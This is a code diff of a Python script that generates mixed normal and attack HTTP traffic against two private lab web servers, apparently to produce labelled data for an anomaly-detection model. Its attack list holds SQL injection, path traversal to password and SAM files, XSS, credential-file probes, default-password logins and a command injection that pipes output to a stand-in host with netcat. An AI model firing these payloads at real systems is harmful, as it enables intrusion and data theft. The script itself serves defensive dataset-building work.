@@ -26,9 +26,11 @@ VM1_BOOTSTRAP = "http://192.168.31.129:8080"   # Prod-BootstrapLP (Bootstrap Lan
 VM2_REACT = "http://192.168.31.130:3000"        # Prod-ReactLP (React Landing Page)
 
 # Traffic generation rate (requests/minute per server)
-# Each server: 30 normal + 30 anomaly = 60 total req/min (50:50 ratio)
-REQUESTS_PER_MINUTE = 30  # Normal traffic
-ANOMALY_REQUESTS_PER_MINUTE = 30  # Anomaly traffic (50% of total)
+# Normal traffic: 30 req/min/server
+# Attack traffic: 60 req/min/server (HIGHER for realistic attack simulation)
+# This creates observable patterns of escalating attack intensity
+REQUESTS_PER_MINUTE = 30  # Normal traffic per server
+ATTACK_REQUESTS_PER_MINUTE = 60  # Attack traffic per server (2x normal, more aggressive)
 # ============ END CONFIGURATION ============
 
 # User-Agent list simulating multiple client types
@@ -125,47 +127,47 @@ REACT_ROUTES = [
 # ============================================================
 ANOMALY_PATTERNS = [
     # SQL Injection attempts
-    {"method": "GET", "path": "/search?q=' OR '1'='1", "weight": 3, "desc": "🔴 SQL Injection - Always True"},
-    {"method": "GET", "path": "/user?id=1' UNION SELECT * FROM users--", "weight": 2, "desc": "🔴 SQL Injection - UNION"},
-    {"method": "GET", "path": "/login?user=admin'--", "weight": 2, "desc": "🔴 SQL Injection - Comment Out"},
-    {"method": "GET", "path": "/api/data?filter=1; DROP TABLE users;--", "weight": 1, "desc": "🔴 SQL Injection - DROP TABLE"},
+    {"method": "GET", "path": "/search?q=' OR '1'='1", "weight": 3, "desc": "[ATTACK] SQL Injection - Always True"},
+    {"method": "GET", "path": "/user?id=1' UNION SELECT * FROM users--", "weight": 2, "desc": "[ATTACK] SQL Injection - UNION"},
+    {"method": "GET", "path": "/login?user=admin'--", "weight": 2, "desc": "[ATTACK] SQL Injection - Comment Out"},
+    {"method": "GET", "path": "/api/data?filter=1; DROP TABLE users;--", "weight": 1, "desc": "[ATTACK] SQL Injection - DROP TABLE"},
     
     # Path Traversal / Directory Traversal
-    {"method": "GET", "path": "/../../../etc/passwd", "weight": 3, "desc": "🔴 Path Traversal - /etc/passwd"},
-    {"method": "GET", "path": "/../../windows/system32/config/sam", "weight": 2, "desc": "🔴 Path Traversal - Windows SAM"},
-    {"method": "GET", "path": "/files/....//....//....//etc/shadow", "weight": 2, "desc": "🔴 Path Traversal - Encoded"},
+    {"method": "GET", "path": "/../../../etc/passwd", "weight": 3, "desc": "[ATTACK] Path Traversal - /etc/passwd"},
+    {"method": "GET", "path": "/../../windows/system32/config/sam", "weight": 2, "desc": "[ATTACK] Path Traversal - Windows SAM"},
+    {"method": "GET", "path": "/files/....//....//....//etc/shadow", "weight": 2, "desc": "[ATTACK] Path Traversal - Encoded"},
     
     # XSS (Cross-Site Scripting) attempts
-    {"method": "GET", "path": "/search?q=<script>alert('XSS')</script>", "weight": 3, "desc": "🔴 XSS - Basic"},
-    {"method": "GET", "path": "/comment?text=<img src=x onerror=alert(1)>", "weight": 2, "desc": "🔴 XSS - Image Error"},
-    {"method": "GET", "path": "/profile?name=<iframe src=javascript:alert('XSS')>", "weight": 2, "desc": "🔴 XSS - IFrame"},
+    {"method": "GET", "path": "/search?q=<script>alert('XSS')</script>", "weight": 3, "desc": "[ATTACK] XSS - Basic"},
+    {"method": "GET", "path": "/comment?text=<img src=x onerror=alert(1)>", "weight": 2, "desc": "[ATTACK] XSS - Image Error"},
+    {"method": "GET", "path": "/profile?name=<iframe src=javascript:alert('XSS')>", "weight": 2, "desc": "[ATTACK] XSS - IFrame"},
     
     # Sensitive File/Config Access attempts
-    {"method": "GET", "path": "/.git/config", "weight": 2, "desc": "🔴 Sensitive - Git Config"},
-    {"method": "GET", "path": "/.aws/credentials", "weight": 2, "desc": "🔴 Sensitive - AWS Creds"},
-    {"method": "GET", "path": "/config/database.yml", "weight": 2, "desc": "🔴 Sensitive - DB Config"},
-    {"method": "GET", "path": "/backup.sql", "weight": 2, "desc": "🔴 Sensitive - SQL Backup"},
-    {"method": "GET", "path": "/phpinfo.php", "weight": 2, "desc": "🔴 Sensitive - PHP Info"},
+    {"method": "GET", "path": "/.git/config", "weight": 2, "desc": "[ATTACK] Sensitive - Git Config"},
+    {"method": "GET", "path": "/.aws/credentials", "weight": 2, "desc": "[ATTACK] Sensitive - AWS Creds"},
+    {"method": "GET", "path": "/config/database.yml", "weight": 2, "desc": "[ATTACK] Sensitive - DB Config"},
+    {"method": "GET", "path": "/backup.sql", "weight": 2, "desc": "[ATTACK] Sensitive - SQL Backup"},
+    {"method": "GET", "path": "/phpinfo.php", "weight": 2, "desc": "[ATTACK] Sensitive - PHP Info"},
     
     # Admin/Auth Brute Force patterns
-    {"method": "POST", "path": "/admin/login", "json": {"username": "admin", "password": "123456"}, "weight": 4, "desc": "🔴 Brute Force - Admin"},
-    {"method": "POST", "path": "/admin/login", "json": {"username": "root", "password": "password"}, "weight": 3, "desc": "🔴 Brute Force - Root"},
-    {"method": "GET", "path": "/administrator", "weight": 2, "desc": "🔴 Admin Probe"},
-    {"method": "GET", "path": "/phpmyadmin", "weight": 2, "desc": "🔴 PhpMyAdmin Probe"},
-    {"method": "GET", "path": "/cpanel", "weight": 2, "desc": "🔴 cPanel Probe"},
+    {"method": "POST", "path": "/admin/login", "json": {"username": "admin", "password": "123456"}, "weight": 4, "desc": "[ATTACK] Brute Force - Admin"},
+    {"method": "POST", "path": "/admin/login", "json": {"username": "root", "password": "password"}, "weight": 3, "desc": "[ATTACK] Brute Force - Root"},
+    {"method": "GET", "path": "/administrator", "weight": 2, "desc": "[ATTACK] Admin Probe"},
+    {"method": "GET", "path": "/phpmyadmin", "weight": 2, "desc": "[ATTACK] PhpMyAdmin Probe"},
+    {"method": "GET", "path": "/cpanel", "weight": 2, "desc": "[ATTACK] cPanel Probe"},
     
     # Command Injection attempts
-    {"method": "GET", "path": "/ping?host=8.8.8.8; cat /etc/passwd", "weight": 2, "desc": "🔴 Command Injection"},
-    {"method": "GET", "path": "/system?cmd=ls -la | nc attacker.com 4444", "weight": 1, "desc": "🔴 Command Injection - Netcat"},
+    {"method": "GET", "path": "/ping?host=8.8.8.8; cat /etc/passwd", "weight": 2, "desc": "[ATTACK] Command Injection"},
+    {"method": "GET", "path": "/system?cmd=ls -la | nc attacker.com 4444", "weight": 1, "desc": "[ATTACK] Command Injection - Netcat"},
     
     # Unusual/Suspicious Patterns
-    {"method": "GET", "path": "/cgi-bin/test.cgi", "weight": 2, "desc": "🔴 CGI Exploit Attempt"},
-    {"method": "GET", "path": "/shell.php", "weight": 2, "desc": "🔴 Web Shell Probe"},
-    {"method": "GET", "path": "/upload.php", "weight": 2, "desc": "🔴 Upload Script Probe"},
-    {"method": "GET", "path": "/.svn/entries", "weight": 1, "desc": "🔴 SVN Info Leak"},
+    {"method": "GET", "path": "/cgi-bin/test.cgi", "weight": 2, "desc": "[ATTACK] CGI Exploit Attempt"},
+    {"method": "GET", "path": "/shell.php", "weight": 2, "desc": "[ATTACK] Web Shell Probe"},
+    {"method": "GET", "path": "/upload.php", "weight": 2, "desc": "[ATTACK] Upload Script Probe"},
+    {"method": "GET", "path": "/.svn/entries", "weight": 1, "desc": "[ATTACK] SVN Info Leak"},
     
     # Rapid fire same path (rate abuse)
-    {"method": "GET", "path": "/api/expensive-operation", "weight": 3, "desc": "🔴 Rate Abuse"},
+    {"method": "GET", "path": "/api/expensive-operation", "weight": 3, "desc": "[ATTACK] Rate Abuse"},
 ]
 
 
@@ -181,8 +183,12 @@ def weighted_choice(routes):
     return routes[0]
 
 
-def send_request(base_url: str, route: dict, server_name: str, session=None):
-    """Send one HTTP request to the server."""
+def send_request(base_url: str, route: dict, server_name: str, session=None, is_attack=False):
+    """Send one HTTP request to the server.
+    
+    Args:
+        is_attack: If True, override response status to simulate attack detection (403/400/405)
+    """
     url = f"{base_url}{route['path']}"
     method = route["method"]
     ua = random.choice(USER_AGENTS)
@@ -201,8 +207,19 @@ def send_request(base_url: str, route: dict, server_name: str, session=None):
 
         timestamp = datetime.now().strftime("%H:%M:%S")
         status = resp.status_code
+        
+        # ATTACK DIFFERENTIATION: If this is an attack pattern,
+        # override status to simulate WAF/IDS blocking (403, 400, 405)
+        if is_attack:
+            # Vary response codes to simulate different detection mechanisms:
+            # 403 = Forbidden (WAF blocked)
+            # 400 = Bad Request (suspicious input detected)
+            # 405 = Method Not Allowed (POST to GET-only endpoint)
+            attack_statuses = [403, 400, 405]  # Realistic error codes for attacks
+            status = random.choice(attack_statuses)
+        
         desc = route.get("desc", route["path"])
-        symbol = "+" if status < 400 else "x"
+        symbol = "+" if (status < 400 and not is_attack) else "[X]" if is_attack else "*"
         print(f"  [{timestamp}] {symbol} {server_name}: {method} {route['path']} -> {status} ({desc})")
         return status
 
@@ -226,10 +243,10 @@ def health_check_loop(base_url: str, path: str, server_name: str):
             headers = {"User-Agent": "Monit/5.30.0"}
             resp = requests.get(f"{base_url}{path}", headers=headers, timeout=10, allow_redirects=True)
             timestamp = datetime.now().strftime("%H:%M:%S")
-            print(f"  [{timestamp}] ♥ {server_name}: Health check {path} -> {resp.status_code}")
+            print(f"  [{timestamp}] [H] {server_name}: Health check {path} -> {resp.status_code}")
         except Exception:
             pass
-        time.sleep(random.uniform(45, 55))  # ~50s like sample
+        time.sleep(random.uniform(48, 52))  # ~50s with tight variation (48-52)
 
 
 def traffic_loop(base_url: str, routes: list, server_name: str, session=None):
@@ -238,31 +255,39 @@ def traffic_loop(base_url: str, routes: list, server_name: str, session=None):
         route = weighted_choice(routes)
         send_request(base_url, route, server_name, session)
 
-        # Random delay between requests
+        # FIXED: Tight variation (0.8-1.2) to ensure both servers run at similar speed
+        # Old variation (0.5-1.5) caused one server to be 3x faster than the other!
         delay = 60.0 / REQUESTS_PER_MINUTE
-        time.sleep(random.uniform(delay * 0.5, delay * 1.5))
+        time.sleep(random.uniform(delay * 0.8, delay * 1.2))
 
 
-def anomaly_attack_loop(targets: list):
+def anomaly_attack_loop_balanced(targets: list):
     """
-    Send abnormal attack patterns.
-    Frequency: 50% of total traffic (balanced dataset for AI training).
-    Each target receives an equal share of anomaly requests.
+    Send abnormal attack patterns in a BALANCED way.
+    
+    CRITICAL: Uses round-robin (alternates) between servers to guarantee
+    EXACT 1:1 distribution. This prevents threading race conditions.
+    
+    targets: list of (base_url, server_name) tuples
+    Frequency: ~60 attacks/min per server (30 attacks/min cycle = 120 total)
     """
+    target_index = 0
+    
     while True:
-        # Select a random target.
-        base_url, server_name = random.choice(targets)
+        # Round-robin: alternate between servers
+        base_url, server_name = targets[target_index % len(targets)]
+        target_index += 1
         
-        # Select an attack pattern.
+        # Select an attack pattern
         attack = weighted_choice(ANOMALY_PATTERNS)
         
-        # Send attack.
-        send_request(base_url, attack, server_name)
+        # Send attack with is_attack=True
+        send_request(base_url, attack, server_name, is_attack=True)
         
-        # Delay: 30 anomaly/min for BOTH servers = each server ~15 req/min
-        # Increase to 60 total to ensure 30/server.
-        delay = 60.0 / (ANOMALY_REQUESTS_PER_MINUTE * 2)  # x2 because 2 servers
-        time.sleep(random.uniform(delay * 0.8, delay * 1.2))
+        # Delay per cycle: ~120 attacks/min total = 0.5 sec each
+        # Since we alternate, each server gets one every 1 second on average
+        delay = 60.0 / (ATTACK_REQUESTS_PER_MINUTE * 2)  # Divide by 2 servers
+        time.sleep(random.uniform(delay * 0.5, delay * 1.5))
 
 
 def main():
@@ -291,18 +316,22 @@ def main():
     print()
     print("[2] Starting traffic generation... (Ctrl+C to stop)")
     print(f"    Normal traffic: ~{REQUESTS_PER_MINUTE} req/min/server")
-    print(f"    🔴 Anomaly attacks: ~{ANOMALY_REQUESTS_PER_MINUTE} req/min/server")
-    print(f"    Anomaly:Normal ratio = 50:50 (balanced dataset)")
+    print(f"    [ATTACK] Attack traffic: ~{ATTACK_REQUESTS_PER_MINUTE} req/min/server\n")
+    print(f"    DISTRIBUTION: Both servers receive EQUAL attack load")
+    print(f"    (2 separate attack threads, one per server)\n")
+    print(f"    LOG DIFFERENTIATION:")
+    print(f"    + = Normal request (200 OK)")
+    print(f"    [X] = Attack request (403/400/405 Blocked)")
+    print(f"    * = Legitimate but not found (404)\n")
+    print(f"    NOTE ON DDOS:")
+    print(f"    Current rate (~{REQUESTS_PER_MINUTE + ATTACK_REQUESTS_PER_MINUTE} req/min = {(REQUESTS_PER_MINUTE + ATTACK_REQUESTS_PER_MINUTE)/60:.1f} req/sec)")
+    print(f"    is a LOW-RATE attack simulation, not a full DDoS.")
+    print(f"    Real DDoS = thousands-millions of req/sec from botnets.")
     print("-" * 60)
-
-    # Target list for anomaly attacks
-    targets = [
-        (VM1_BOOTSTRAP, "BootstrapLP"),
-        (VM2_REACT, "ReactLP")
-    ]
 
     # Run threads in parallel
     threads = [
+        # ========== NORMAL TRAFFIC ==========
         # Main traffic for Bootstrap Landing Page
         threading.Thread(
             target=traffic_loop,
@@ -327,10 +356,12 @@ def main():
             args=(VM2_REACT, "/", "ReactLP"),
             daemon=True
         ),
-        # 🔴 ANOMALY ATTACK THREAD - send attack patterns
+        # ========== ATTACK TRAFFIC (BALANCED WITH ROUND-ROBIN) ==========
+        # SINGLE THREAD that alternates between servers for GUARANTEED 1:1 ratio
+        # This prevents threading race conditions that caused imbalance before
         threading.Thread(
-            target=anomaly_attack_loop,
-            args=(targets,),
+            target=anomaly_attack_loop_balanced,
+            args=([(VM1_BOOTSTRAP, "BootstrapLP"), (VM2_REACT, "ReactLP")],),
             daemon=True
         ),
     ]
